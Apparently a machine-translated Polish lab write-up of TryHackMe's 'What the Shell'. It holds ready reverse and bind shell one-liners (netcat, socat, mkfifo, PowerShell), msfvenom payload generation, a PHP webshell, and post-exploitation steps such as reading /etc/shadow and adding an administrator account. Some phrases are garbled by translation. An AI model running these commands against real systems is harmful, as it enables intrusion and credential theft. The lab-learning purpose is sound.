---

Tagi: [#payloads](https://publish.obsidian.md/#payloads) [#ReverseShell](https://publish.obsidian.md/#ReverseShell) [#netcat](https://publish.obsidian.md/#netcat) [#Metasploit](https://publish.obsidian.md/#Metasploit) [#msfvenom](https://publish.obsidian.md/#msfvenom) [#Linux](https://publish.obsidian.md/#Linux) [#Windows](https://publish.obsidian.md/#Windows)  
Linki: [Bibliografia > Reverse Shell](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/Bibliography%20Shell)

---

**Spis treści**

- [**Definicja powłoki**](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell#**Definition%20of%20a%20Shell**)
- [**Narzędzia**](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell#**Tools**)
    - [Netcat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell#**Tools**#Netcat)
    - [Socat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell#**Tools**#Socat)
    - [Metasploit -- multi/handler:](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell#**Tools**#Metasploit%20--%20multi/handler:)
- [Przykład odwróconej powłoki](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Shell%20Example)
- [Przykład powłoki Bind](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Shell%20Example)
- [Interaktywność](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell)
- [Netcat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell)
    - [Stabilizacja Netcat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Stabilization)
        - [Stabilizacja Pythona](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Stabilization%20Stabilization)
        - [rlwrap](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Stabilization)
        - [Socat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Stabilization)
        - [Zmiana rozmiaru terminala TTY](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Stabilization%20the%20Terminal%20TTY%20size)
- [Socat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell)
    - [Odwrócone muszle](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Shells)
    - [Połącz muszle](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Shells)
    - [Stabilna odwrotna powłoka TTY dla systemu Linux](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Stable%20Linux%20TTY%20Reverse%20Shell)
    - [Uzyskiwanie interaktywnej powłoki za pomocą Socat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20an%20Interactive%20Shell%20with%20Socat)
    - [Szyfrowane powłoki Socat](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Encrypted%20Shells)
- [Typowe ładunki](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Payloads)
    - [Opcja 1: Tryb łatwy (jeśli Twoja wersja Netcata obsługuje `-e`)](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Payloads%201:%20Easy%20Mode%20\(if%20your%20version%20of%20Netcat%20supports%20%60-e%60\))
        - [Połącz powłokę:](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%201:%20Easy%20Mode%20\(if%20your%20version%20of%20Netcat%20supports%20%60-e%60\)#Bind%20Shell:)
        - [Odwrócona powłoka:](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%201:%20Easy%20Mode%20\(if%20your%20version%20of%20Netcat%20supports%20%60-e%60\)#Reverse%20Shell:)
    - [Opcja 2: Bezpieczniejsze obejście (dla Linux Netcat bez `-e`)](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Payloads%202:%20Safer%20Workaround%20\(for%20Linux%20Netcat%20without%20%60-e%60\))
        - [Utwórz nasłuchiwacza powłoki Bind](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%202:%20Safer%20Workaround%20\(for%20Linux%20Netcat%20without%20%60-e%60\)#Create%20a%20Bind%20Shell%20Listener)
        - [Wyślij odwrotną powłokę](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%202:%20Safer%20Workaround%20\(for%20Linux%20Netcat%20without%20%60-e%60\)#Send%20a%20Reverse%20Shell)
        - [Atakowanie serwera Windows](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%202:%20Safer%20Workaround%20\(for%20Linux%20Netcat%20without%20%60-e%60\)#Attacking%20a%20Windows%20Server)
- [msfvenom](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell)
- [Metasploit multi/handler](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20multi/handler)
- [Webshelle](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell)
- [Następne kroki po uzyskaniu powłoki](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Steps%20After%20Achieving%20a%20Shell)
    - [Linux](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Steps%20After%20Achieving%20a%20Shell)
    - [Okna](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell%20Steps%20After%20Achieving%20a%20Shell)
- [Odniesienia](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/CastleCrashing/TryHackMe+Lab+-+What+The+Shell)

---

Poniższy tekst pochodzi z laboratorium TryhackMe „What the Shell”. Celem jest dogłębne poznanie narzędzi używanych do konfigurowania powłok dla atakujących, a także popularnych taktyk. Odwiedź je i wypróbuj je samodzielnie [tutaj](https://tryhackme.com/room/introtoshells) !

To będzie długie, więc przygotuj się na szok! Hahaha... ha

## **Definicja powłoki** 

Czym jest powłoka? Mówiąc najprościej, jest to interfejs, którego używamy podczas interakcji z systemem operacyjnym.

Istnieją dwa rodzaje powłok, które możemy spróbować wymusić:

1. Powłoka **odwrotna** na serwerze zdalnym inicjuje połączenie z nami, którego następnie używamy w celu uzyskania dostępu do ofiary.
    1. Wymaga to skonfigurowania sieci i _odbiornika_ na komputerze lokalnym
    2. Ogólnie łatwiej debugować
2. Powłoka **wiążąca** , która polega na otwarciu portu na serwerze zdalnym, z którym możemy się połączyć.
    1. Kod jest wykonywany na komputerze docelowym i uruchamia program nasłuchujący podłączony do powłoki, który następnie otwiera się na Internet.
    2. Nie wymaga konfiguracji sieci
    3. Może zostać zablokowany przez zapory wychodzące chroniące cel.

## **Narzędzia** 

Przykładami różnych narzędzi są:

- Netcat
- Socat
- Metasploit - multi/handler
- Msfvenom

### Netcat 

Tradycyjne narzędzie. Potrafi wykonywać takie czynności jak:

- przechwytywanie banerów podczas wyliczania
- odbierać odwrócone pociski
- Bardzo niestabilny i łatwy do zgubienia
- Zwykle występuje w większości dystrybucji Linuksa

### Socat 

- Netcat na sterydach. Potrafi wszystko to, co Netcat, i jeszcze więcej.
- Zwykle bardziej stabilny
- składnia jest trudna
- socat zazwyczaj nie jest dostępny w większości dystrybucji Linuksa

### Metasploit -- multi/handler: 

- odbiera `exploit/multi/handler`odwrotne powłoki, takie jak socat i netcat
- stabilny
- Jedyny sposób interakcji z powłoką **Meterpretera**
- najłatwiejszy sposób obsługi ładunków etapowych

## Przykład odwróconej powłoki 

Konfiguracja na maszynie atakującej:

```terminal
sudo nc -nvlp 9001
```

Na cel:

```terminal
nc <ip_address> <port> -e /bin/bash
```

Umożliwi to maszynie atakującej interakcję ze zdalnym systemem.

## Przykład powłoki Bind 

Poniższy przykład wykorzystuje komputer z systemem Windows.

Wydaj polecenie obiektowi docelowemu, aby uruchomił nasłuchiwacz, a następnie wykonaj `cmd.exe`:

```terminal
nc -nvlp <port> -e "cmd.exe
```

A na maszynie atakującej:

```terminal
nc machine_ip <port>
```

## Interaktywność 

Muszle mogą być **interaktywne** lub **nieinteraktywne**

**Powłoki interaktywne** to standardowe środowiska CLI: bash, sh, powershell itp. Umożliwiają one interakcję z programami po ich uruchomieniu.

**Powłoki nieinteraktywne** są ograniczone do programów, które nie wymagają interakcji użytkownika do prawidłowego działania. Uruchomienie polecenia, takiego jak [ brakuje kontekstu - kontekst wymaga kontekstu `whoami`]. zwróci instrukcję, ponieważ system nie potrzebował użytkownika do wykonania działania, ale uruchomienie [ brakuje kontekstu - kontekst wymaga kontekstu `ssh`]. , które zazwyczaj wymaga od użytkownika interakcji (np. podania hasła), nie zwróci żadnych wyników.

Uruchomienie polecenia interaktywnego w powłoce nieinteraktywnej gdzieś _prowadzi_ ... ale dokąd? Tak czy inaczej, po prostu nie działają.

Większość prostych powłok **odwrotnych** i **wiążących** **nie jest interaktywna**

## Netcat 

`nc -nvlp <port>`

Uwagi dotyczące numeru portu:

- Można używać dowolnego portu, pod warunkiem, że nie jest on używany przez inną usługę
- `sudo`W poleceniu należy użyć portu poniżej 1024
- Dobrym pomysłem jest użycie znanego portu (80, 443, 53), ponieważ istnieje większe prawdopodobieństwo ominięcia reguł zapory sieciowej ruchu wychodzącego obiektu docelowego.  
    _UWAGA:_ Po przechwyceniu powłoki należy nacisnąć **klawisz Enter** , aby ją odebrać i rozpocząć interakcję z nią.

### Stabilizacja Netcat 

Ponieważ „powłoki” netcata to w rzeczywistości **procesy** działające wewnątrz powłoki, połączenia mogą być niestabilne lub trudniejsze w obsłudze niż w przypadku tradycyjnego terminala. W systemie Linux netcata można dodatkowo ustabilizować, stosując trzy poniższe techniki.

1. Pyton
2. rlwrap
3. Socat

Stabilizacja w systemie Windows jest znacznie trudniejsza

#### Stabilizacja Pythona 

Poniższe informacje dotyczą tylko systemu Linux. Są trzy etapy:

1. Użyj `python -c 'import pty;pty.spawn("/bin/bash")'`Pythona, aby utworzyć powłokę bash o lepszych funkcjach. _Niektóre cele mogą wymagać podania wersji Pythona._
    1. Mój terminal wyświetli komunikat „połączenie otrzymano z < `ip`>” i nic więcej. Powyższe polecenie uruchomi coś, co będzie wyglądać jak typowa powłoka.
2. Użyj `export TERM=xterm`, aby przyznać dostęp do poleceń terminów, takich jak`clear`
3. Tło powłoki za pomocą`Ctrl + Z`
    1. `[1]+ Stopped`pokaże się na moim terminalu
4. Na naszym lokalnym terminalu użyj`stty raw -echo; fg`
    1. Wyłącza to nasze własne echo terminala, dając nam dostęp do automatycznego uzupełniania kart, klawiszy strzałek i `Ctrl + C`kończenia procesów.
    2. Wysuwa również powłokę na pierwszy plan, co kończy proces.

Powłoka jest teraz interaktywna.

_Należy pamiętać_ , że jeśli powłoka przestanie działać, wszelkie dane wprowadzane w terminalu nie będą widoczne, ponieważ wyłączyliśmy echo terminala. Aby to naprawić, wpisz tekst  `reset` i naciśnij enter.

Oto pełna technika:  
![nc_python_stabilization.png](https://publish-01.obsidian.md/access/c50a83218fb370a3e7b8dd6a3c104c92/Cybersecurity/Blog/assets/shells/nc_python_stabilization.png)

#### rlwrap 

rlwrap zapewnia dostęp do historii, autouzupełniania kart i klawiszy strzałek. Nie jest on również domyślnie zainstalowany w systemie Kali. Zainstaluj za pomocą`sudo apt install rlwrap`

Użyj rlwrap z następującym poleceniem:

```terminal
rlwrap nc -nlvp <port>
```

Dzięki temu otrzymujemy powłokę o większej liczbie funkcji, co przydaje się podczas korzystania z powłok **systemu Windows** .

Na komputerze z systemem Linux można dodatkowo ustabilizować powłokę, wykonując kroki trzeci i czwarty stabilizacji języka Python:

1. Tło powłoki za pomocą`Ctrl + Z`
2. Na naszym lokalnym terminalu użyj`stty raw -echo; fg`

#### Socat 

Prostym sposobem na ustabilizowanie powłoki jest użycie netcata do przejścia do powłoki Socat o większych możliwościach.

_Uwaga_ : dotyczy to w zasadzie wyłącznie systemów Linux, ponieważ powłoka Socat jest tak samo stabilna jak powłoka netcat w systemie Windows (tj. nie za bardzo).

**W przypadku systemu Linux**  
przenieś [skompilowany plik binarny socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) do celu.

1. Uruchom serwer WWW na _maszynie atakującej_ , używając wbudowanego w Pythonie skryptu `http.server`, w katalogu zawierającym plik binarny socat. Serwer ten będzie obsługiwał bieżący katalog przez HTTP.

```terminal
sudo python3 -m http.server 80
```

Uwaga: `sudo`port 80 jest portem uprzywilejowanym

2. Na _komputerze docelowym_ użyj powłoki netcat, aby pobrać plik.

```terminal
wget <hacker_ip>/socat -O /tmp/socat
```

**W przypadku systemu Windows:**  
w środowisku wiersza poleceń systemu Windows można wykonać to samo za pomocą programu PowerShell, używając klasy systemowej Invoke-WebRequest lub klasy systemowej webrequest, w zależności od zainstalowanej wersji programu PowerShell

```powershell
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

#### Zmiana rozmiaru terminala TTY 

Zwykle terminal automatycznie zmienia rozmiar TTY. W przypadku powłoki odwróconej zazwyczaj mamy do czynienia z **bardzo surową, ograniczoną powłoką** . Oto, co może pójść nie tak:

1. **Brak TTY (brak emulacji terminala)**  
    Nie można używać poleceń takich jak `sudo`, `nano`lub `vi`— narzekają one, że „to nie jest tty”.
2. **Nieprawidłowy lub brakujący rozmiar TTY**  
    Programy będą dziwnie formatować dane wyjściowe, nie będą prawidłowo zawijać tekstu lub uszkodzą narzędzia interaktywne, takie jak `htop`, `less`lub edytory tekstu.
3. **Błędy kopiowania/wklejania i renderowania**  
    Powłoka może zachowywać się nieprawidłowo, jeśli rozmiar terminala nie odpowiada oczekiwaniom powłoki zdalnej.

Aby skorygować rozmiar, wykonaj następujące czynności:

1. Uruchom `stty -a`i zanotuj wartości dla „wierszy” i „kolumn”
2. W powłoce odwrotnej/wiążącej uruchom `stty rows <noted_row_number>`i `stty cols <noted_column_number>`, wprowadzając wcześniej zanotowane wiersze i kolumny.

## Socat 

Składnia polecenia socat jest inna.

### Odwrócone muszle 

Poniżej przedstawiono podstawowy nasłuchiwacz powłoki odwrotnej w socat:

```cmd
socat TCP-L:<port> -
```

w **systemie Windows**

```powershell
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

_Uwaga: opcja „pipes” wymusza na programie PowerShell lub cmd.exe używanie wejścia i wyjścia w stylu systemu Unix_

W **systemie Linux**

```terminal
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

### Połącz muszle 

W przypadku systemu **Linux** użyj:

```terminal
socat TCP-L:<port> EXEC:"bash -li"
```

W przypadku systemu **Windows** użyj:

```powershell
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

Następnie na naszej atakującej maszynie użyj:

```terminal
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Stabilna odwrotna powłoka TTY dla systemu Linux 

Jest to jedna z najczęściej używanych aplikacji Socat.

Używać:

```terminal
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

To polecenie przekazuje bieżący TTY jako plik i ustawia echo na 0, co jest mniej więcej tym samym, co użycie `Ctrl + Z`komendy `stty raw -echo; fg`. Dzięki temu połączenie jest stabilne z pełnym TTY.

### Uzyskiwanie interaktywnej powłoki za pomocą Socat 

Do nawiązania połączenia zwrotnego z podstawowym programem nasłuchującym możesz użyć niemal dowolnego ładunku, ale jeśli chcesz mieć **w pełni interaktywną i stabilną powłokę** , musisz użyć specjalnego **polecenia socat** na komputerze docelowym.

W większości systemów **socat nie jest domyślnie zainstalowany** , ale możesz wgrać [**skompilowany plik binarny socat**](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) i go uruchomić.

Na komputerze ofiary:

```terminal
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

```

Co robi — w prostych słowach:

1. **Nawiązuje połączenie** z słuchaczem atakującego (tą `TCP:<ip>:<port>`częścią).
2. **Uruchamia właściwą powłokę bash** ( `EXEC:"bash -li"`).
3. **Dodaje opcje,** które sprawiają, że powłoka jest stabilna i użyteczna:
    - **pty** sprawia, że ​​zachowuje się jak prawdziwy terminal i redukuje dziwne zachowanie powłoki
    - **stderr** wysyła do Ciebie komunikaty o błędach
    - **sigint** pozwala na użycie`Ctrl + C`
    - **setsid** umożliwia uruchomienie powłoki w jej własnej sesji (przydatne do kontroli procesów)
    - **sane** resetuje ustawienia terminala, aby wszystko działało normalnie

### Szyfrowane powłoki Socat 

Zaszyfrowanych powłok nie da się szpiegować bez klucza deszyfrującego, co często prowadzi do omijania systemu IDS. Użyj `OPENSSL`flagi zamiast `TCP`w poleceniu Socat. Aby z niej skorzystać, należy najpierw utworzyć certyfikaty.

**Odwrócona powłoka**

1. Na maszynie atakującej:

```terminal
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

To polecenie tworzy 2048-bitowy klucz RSA z pasującym plikiem certyfikatu, podpisany przez siebie i ważny przez niecały rok. Podczas uzupełniania informacji o certyfikacie, pozostaw to pole puste lub wpisz je losowo.

2. Połącz nowe pliki w plik **.pem** :

```terminal
cat shell.key shell.crt > shell.pem
```

3. Teraz skonfiguruj nasłuchiwacza powłoki odwrotnej:

```terminal
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

`verify=0`Nakazuje połączeniu ignorowanie prób weryfikacji certyfikatu podpisanego przez siebie. Upewnij się, że certyfikat jest obecny na komputerze nasłuchującym, w przeciwnym razie istnieje ryzyko niepowodzenia.

Aby ukończyć odwrotną powłokę;

```terminal
socat OPENSSL:<attacker_ip>:<PORT>,verify=0 EXEC:/bin/bash
```

Ponieważ ofiara używa `verify=0`, nie musi ufać ani posiadać klucza publicznego atakującego.

Aby połączyć stabilną powłokę odwrotną TTY i powłokę interaktywną:

**Napastnik**

```terminal
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

Ofiara nawiązuje kontakt z:

```terminal
socat openssl:10.10.10.5:53,verify=0 exec:"bash -li",pty,stderr,sigint,setsid,sane
```

**Powiąż**  
cel powłoki:  
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Napastnik:  
`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

Certyfikat musi być używany z programem nasłuchującym, więc skopiowanie pliku PEM do powłoki bind jest wymagane, nawet w przypadku komputera z systemem Windows.

## Typowe ładunki 

### Opcja 1: Tryb łatwy (jeśli Twoja wersja Netcata obsługuje tę opcję `-e`) 

Niektóre wersje Netcata (np. w systemie Windows lub starszych wersjach Linuksa) oferują taką `-e`opcję. Pozwala ona na uruchomienie programu (takiego jak `/bin/bash`), gdy ktoś połączy się z programem nasłuchującym.

#### Połącz powłokę: 

`nc -lvnp <PORT> -e /bin/bash`

Uruchamiasz go na **komputerze docelowym** — po nawiązaniu połączenia otrzymujesz powłokę.

#### Odwrócona powłoka: 

`nc <ATTACKER-IP> <PORT> -e /bin/bash`

Uruchamiasz go na komputerze **docelowym** , a on łączy się z Tobą za pomocą powłoki.

Oto problem: _Większość współczesnych wersji Netcata **usuwa** przełącznik `-e`, ponieważ jest on niebezpieczny._ W końcu, czy naprawdę chcę, aby mój serwer zezwalał na natychmiastowe wykonywanie poleceń po połączeniu?

### Opcja 2: Bezpieczniejsze obejście (dla Linux Netcat bez `-e`) 

Jeśli `-e`nie jest dostępny, możemy **symulować to samo zachowanie,** używając nazwanego potoku.

#### Utwórz nasłuchiwacza powłoki Bind 

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f`

**Co to robi**

- `mkfifo /tmp/f`:Tworzy specjalny plik („nazwany potok”), który umożliwia procesom komunikację między sobą.
- Uruchamia **Netcata** , nasłuchującego na porcie.
- Wszystko, co wpisujesz, jest wysyłane do `/bin/sh`(powłoki).
- Dane wyjściowe powłoki są przesyłane z powrotem do Ciebie przez kanał komunikacyjny.
- `rm /tmp/f`:Następnie czyści rurę.

Nie musisz do końca rozumieć, jak działa potok — wystarczy, że wiesz, że to polecenie udostępnia działającą **powłokę bind** bez potrzeby używania `-e`.

Na maszynie atakującej użyłbym powyższego polecenia zamiast zwykłego`nc <attack_ip> <p> -e /bin/bash`

#### Wyślij odwrotną powłokę 

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

#### Atakowanie serwera Windows 

W przypadku nowoczesnych systemów Windows Server bardzo często wymagana jest odwrotna powłoka programu PowerShell, dlatego tutaj omówimy standardową, jednowierszową powłokę odwrotną PSH.

To polecenie jest bardzo zawiłe, więc dla uproszczenia nie będziemy go tutaj bezpośrednio wyjaśniać. Jest to jednak niezwykle przydatny, jednolinijkowy kod, który warto mieć pod ręką:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Aby z tego skorzystać, musimy zastąpić parametr `<IP>`▲ `<port>`odpowiednim adresem IP i wybrać port. Następnie można go skopiować do powłoki cmd.exe (lub innej metody wykonywania poleceń na serwerze Windows, takiej jak webshell) i uruchomić, co spowoduje utworzenie powłoki odwrotnej.

## msfvenom 

[msfvenom](https://publish.obsidian.md/castledefender/Cybersecurity/Blog/Glossary/msfvenom) jest częścią frameworka Metasploit i generuje kod głównie dla powłok odwrotnych i wiążących.

- użyj w rozwoju exploitów niższego poziomu, aby wygenerować kod powłoki w formacie szesnastkowym, aby wykorzystać exploity, takie jak przepełnienie bufora
- może być używany do generowania ładunków w wielu formatach

Użycie msfvenom wygląda następująco:

```terminal
msfvenom -p <payload> <options>
```

który w akcji wyglądałby tak

```terminal
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

- **-f** określa _exe_ jako format wyjściowy (w tym przykładzie jest to plik wykonywalny)
- **-o** określa lokalizację wyjściową i nazwę pliku dla ładunku
- **LHOST=listen-IP** określa adres IP, z którym należy nawiązać połączenie zwrotne (czyli adres IP atakującego)
- **LPORT** określa port na komputerze atakującego, z którym należy się połączyć.

## Metasploit multi/handler 

Metasploit Multi/Handler służy do wychwytywania odwrotnych powłok.

1. Otwórz Metasploit za pomocą `msfconsole`
2. Wpisz  `use multi/handler`i naciśnij enter

Metasploit nie nasłuchuje na wszystkich interfejsach sieciowych, takich jak netcat czy socat, dlatego upewnij się, że określiłeś `LHOST`.

Użyj tych poleceń, aby ustawić ładunek, LHOST i LPORT:

1. `set PAYLOAD <payload>`
2. `set LHOST <listen-address>`
3. `set LPORT <listen-port>`

Następnie uruchom program nasłuchujący, działający jako zadanie w tle:

`exploit -j`

Jeśli używasz portu poniżej 1024, upewnij się, że używasz `sudo`!

Gdy będziesz gotowy, ponownie ustaw multi/handler na pierwszym planie

`sessions <multi/handler session number>`

## Webshelle 

„Webshell” to potoczne określenie skryptu uruchamianego wewnątrz serwera WWW, np. w oparciu o PHP lub JavaScript, którego można używać do uruchamiania kodu na serwerze.

Polecenia i argumenty są zazwyczaj wpisywane na stronie internetowej, na przykład w adresie URL, w celu wykonania, a następnie zwracane i zapisywane na stronie internetowej. Często jest to wykorzystywane do przejścia do pełnej powłoki odwrotnej/bind.

Przykład podstawowej linii kodu PHP:

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

Następnie, gdybyśmy mieli następujący adres URL

`victim.com/shell.php?cmd=xyz`

Hipotetycznie moglibyśmy wprowadzić nasze polecenia do `?cmd`argumentu, na przykład `whoami`lub `hostname`.

Należy pamiętać, że większość ogólnych, specyficznych dla danego języka (np. PHP) powłok odwrotnych jest pisana dla systemów Unix, takich jak serwery WWW Linux. Domyślnie nie będą one działać w systemie Windows.

## Następne kroki po uzyskaniu powłoki 

Celem jest uzyskanie lepszego punktu zaczepienia w maszynie, gdyż powłoka zdalna nigdy nie jest tak wydajna jak powłoka natywna.

### Linux 

W przypadku systemu Linux kolejnym krokiem jest najczęściej poszukiwanie możliwości uzyskania dostępu do konta użytkownika:

- szukam kluczy SSH na`/home/<user>/.ssh`
- patrząc na `/etc/shadow`lub`/etc/password`

Umożliwią szybki dostęp do maszyny za pomocą protokołu SSH (jeśli protokół SSH jest uruchomiony)

### Okna 

Hasła do uruchomionych usług można czasami znaleźć w rejestrze.

- Serwery VNC mogą mieć hasła w postaci zwykłego tekstu przechowywane w rejestrze
- niektóre wersje Filezilla FTP pozostawiają również dane uwierzytelniające w pliku XML:

`C:\Program Files\FileZilla Server\FileZilla Server.xml`

 Lub 

`C:\xampp\FileZilla Server\FileZilla Server.xml`

Jeśli możesz uruchomić powłokę jako użytkownik SYSTEM lub jako konto administratora, możesz po prostu dodać do komputera własne konto administratora, a następnie nawiązać połączenie za pomocą protokołu RDP, narzędzia psexec lub innej metody:

`net user <username> <password> /add`  
Następnie  
`net localgroup administrators <username> /add`

## Przechodząc przez laboratorium 

To wszystko było przygotowaniem do laboratorium. Zobaczmy, co da się zrobić!

Tryhackme udostępnił mi dwa środowiska testowe: komputer z Linuksem i komputer z Windowsem. Zaczynam najpierw na komputerze **z Linuksem** .

### Zabawa z Linuksem 

Najpierw skonfiguruję webshell na serwerze Linux i przećwiczę jego stabilizację.

Utworzyłem plik o nazwie **shell.php** ;

```php
<?php system($_GET['cmd']); ?>
```

Maszyna sandbox pozwala na przesyłanie plików bez żadnych kontroli, więc po prostu przesyłam plik, a następnie przeglądam go i w adresie URL aktywuję plik za pomocą:

```
<URL>?cmd=nc <attack_ip> 4444 -e /bin /bash
```

( _Uwaga_ : nie potrzebuję cudzysłowów w powyższym zdaniu. Skonfigurowałem również nasłuchiwacz nc na moim atakującym komputerze)

Potem się ustabilizowałem!

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
    1. Mój terminal najpierw wyświetlił komunikat „połączenie otrzymane z < `ip`>” i nic więcej, gdy początkowo przechwycił powłokę. Powyższe polecenie uruchomiło coś, co wyglądało jak typowa powłoka.
2. `export TERM=xterm`
3. Tło powłoki za pomocą`Ctrl + Z`
    1. `[1]+ Stopped`pokaże się na moim terminalu
4. Na moim lokalnym terminalu użyj`stty raw -echo; fg`

Jako eksperyment spróbowałem skonfigurować go `rlwrap`jako powłokę, postępując zgodnie z powyższymi instrukcjami. Próbowałem tego sam, ale nie udało mi się go ustabilizować. rlwrap działał i nie wymagał instalacji na moim komputerze z Kali, ale nie zachowywał się tak dobrze, jak przy użyciu stabilizacji Pythona.

#### Korzystanie z Pentest Monkey 

To proste! Tryhackme udostępnił mi kopię pliku powłoki. Musiałem tylko zmienić adres IP mojego Attackboksa, zanotować używany port (mógłbym go zmienić, gdybym chciał), a następnie skonfigurować nasłuchiwanie netcata na tym porcie.

Na komputerze ofiary przesłałem plik i otworzyłem go na serwerze WWW ofiary. Nie musiałem nic więcej robić, po prostu połączył się z moim komputerem i wyglądał całkiem nieźle.

### Zabawa z mkfifo 

Następne zadanie polegało na nawiązaniu połączenia SSH z ofiarą i `mkfifo`skonfigurowaniu powłok bind i reverse na komputerze docelowym.

Ponownie korzystam z systemu Linux Sandbox i podałem dane logowania **SSH** , aby się zalogować, a następnie na komputerze ofiary użyłem następujących poleceń w terminalu:

1. użyłem `nc -nvlp 4444`do skonfigurowania mojego słuchacza
2. Zastosowano go na komputerze docelowym  
    `mkfifo /tmp/f; nc <attack_ip> <p> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f`  
    do połączenia powłoki odwrotnej, co zadziałało zgodnie z oczekiwaniami.

Następnie przetestowałem połączenie bind:

1. `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
2. Na maszynie atakującej:  
    `nc <victim_ip> <p>`  
    ``

### Gra z Socat 

